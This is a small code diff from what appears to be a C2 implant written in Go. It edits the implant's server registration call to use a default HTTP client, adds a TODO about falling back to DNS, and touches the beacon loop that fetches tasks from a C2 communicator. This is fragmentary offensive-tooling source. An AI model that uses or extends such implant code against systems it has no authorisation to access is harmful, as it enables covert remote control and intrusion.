@@ -61,7 +61,8 @@ func (i *Implant) register() (string, error) {
 	}
 	req.Header.Set("Content-Type", "application/json")
 
-	resp, err := i..Do(req) // PLZ give me https communicator
+	// TODO: this is bad, should not be using http.DefaultClient, when already creating a client in HTTPS listener. should register depending on if it can reach HTTPS, else do DNS
+	resp, err := http.DefaultClient.Do(req) // PLZ give me https communicator
 	if err != nil {
 		return "", fmt.Errorf("do request: %w", err)
 	}
@@ -114,7 +115,7 @@ func (i *Implant) BeaconLoop() error {
 
 		// perform beacon
 		// TODO: instead of returning TaskQueue, error, should return TaskQueue, malformedTasks []Task -> then use those to create a result
-		var err error
+		var err error // why need this
 		i.TaskQueue, err = i.C2Communicator.Beacon(i.ID, i.Results)
 		if err != nil {
 			return nil
